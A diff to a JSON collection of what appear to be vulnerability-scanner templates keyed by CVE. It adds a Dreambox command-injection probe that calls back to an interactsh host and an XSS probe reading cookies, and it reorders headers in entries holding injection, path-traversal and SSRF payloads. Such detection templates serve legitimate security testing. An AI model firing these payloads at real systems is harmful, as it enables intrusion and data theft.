@@ -4907,6 +4907,20 @@
       ]
     },
     {
+      "id": "CVE-2017-14135",
+      "info": {
+        "name": "Dreambox 2.0.0 RCE",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /webadmin/script?command=|%20nslookup%20{{interactsh-url}} HTTP/1.1\nHost: {{Hostname}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-14535",
       "info": {
         "name": "Trixbox - 2.8.0.4 OS Command Injection Vulnerability",
@@ -4961,6 +4975,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/static/../../../a/../../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-15287",
+      "info": {
+        "name": "Dreambox WebControl Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /webadmin/pkg?command=<script>alert(document.cookie)</script> HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n"
           ]
         }
       ]
@@ -5930,11 +5958,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
+            "X-Tika-OCRTesseractPath": "cscript",
+            "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
             "Content-type": "image/jp2",
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
-            "X-Tika-OCRLanguage": "//E:Jscript"
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -8588,8 +8616,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -9767,8 +9795,8 @@
         {
           "body": "op=login&username=;`cat /etc/passwd`&password=\n",
           "headers": {
-            "Referer": "{{Hostname}}/module/login/login.html",
-            "Content-Type": "application/x-www-form-urlencoded"
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": "{{Hostname}}/module/login/login.html"
           },
           "method": "POST",
           "path": [
@@ -10121,9 +10149,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "Cookie": "Login",
             "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
-            "content-type": "text/xml",
-            "Cookie": "Login"
+            "content-type": "text/xml"
           },
           "method": "POST",
           "path": [
@@ -14574,7 +14602,7 @@
       "id": "CVE-2021-44528",
       "info": {
         "name": "Open Redirect in Host Authorization Middleware",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
